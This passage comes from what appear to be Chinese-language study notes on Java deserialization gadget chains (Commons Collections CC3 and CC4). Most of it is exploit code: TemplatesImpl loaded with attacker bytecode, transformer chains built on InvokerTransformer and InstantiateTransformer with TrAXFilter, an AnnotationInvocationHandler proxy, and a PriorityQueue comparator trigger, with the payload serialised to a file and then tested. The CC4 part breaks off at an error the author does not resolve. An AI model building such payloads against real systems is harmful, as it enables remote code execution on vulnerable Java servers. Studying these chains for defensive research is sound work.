        namefiled.setAccessible(true);
        namefiled.set(templates,"114514");
        Field bycodesfiled = tc.getDeclaredField("_bytecodes");
        bycodesfiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D://tmp/classes/Test.class"));

        byte[][] codes = {code};
        bycodesfiled.set(templates,codes);
        Field tfactoryfield = tc.getDeclaredField("_tfactory");
        tfactoryfield.setAccessible(true);
        tfactoryfield.set(templates,new TransformerFactoryImpl());
        //templates.newTransformer();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(114514);
        Map innermap = new HashMap();
        innermap.put("value", "xxx");
        Map outmap = TransformedMap.decorate(innermap, null, chainedTransformer);
        //通过反射获得AnnotationInvocationHandler类对象
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //通过反射获得cls的构造函数
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        //这里需要设置Accessible为true，否则序列化失败
        ctor.setAccessible(true);
        //通过newInstance()方法实例化对象
        InvocationHandler handler = (InvocationHandler)ctor.newInstance(Retention.class, outmap);
        Map mapproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),handler);
        Object instance = ctor.newInstance(Retention.class,mapproxy);

        payload2File(instance,"obj");
        payloadTest("obj");

    }
}

```
## 流程图
![](https://cdn.nlark.com/yuque/0/2023/jpeg/34502958/1684068748820-dd22fbe6-c47c-456d-b3f0-5ecc7efad883.jpeg)
# cc3之TrAXFilter
```java
InstantiateTransformer instantiateTransformer =  new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        instantiateTransformer.transform(TrAXFilter.class);
```
```java
InstantiateTransformer instantiateTransformer =  new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),instantiateTransformer

        };

```

## InstantiateTransformer
```java
public Object transform(Object input) {
        try {
            if (!(input instanceof Class)) {
                throw new FunctorException("InstantiateTransformer: Input object was not an instanceof Class, it was a " + (input == null ? "null object" : input.getClass().getName()));
            } else {
                Constructor con = ((Class)input).getConstructor(this.iParamTypes);
                return con.newInstance(this.iArgs);
            }
```
获取构造函数并创建实例
```java
public TrAXFilter(Templates templates)  throws
        TransformerConfigurationException
    {
        _templates = templates;
        _transformer = (TransformerImpl) templates.newTransformer();
        _transformerHandler = new TransformerHandlerImpl(_transformer);
        _useServicesMechanism = _transformer.useServicesMechnism();
    }
```
调用newTransformer方法。
# cc4
```java
ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
    public static void  main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field namefiled = tc.getDeclaredField("_name");
        namefiled.setAccessible(true);
        namefiled.set(templates,"114514");
        Field bycodesfiled = tc.getDeclaredField("_bytecodes");
        bycodesfiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D://tmp/classes/Test.class"));

        byte[][] codes = {code};
        bycodesfiled.set(templates,codes);
        Field tfactoryfield = tc.getDeclaredField("_tfactory");
        tfactoryfield.setAccessible(true);
        tfactoryfield.set(templates,new TransformerFactoryImpl());
        //templates.newTransformer();
        InstantiateTransformer instantiateTransformer =  new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),instantiateTransformer

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
```
不知道为啥，报不可序列化错，Priorityqueue可以序列化的
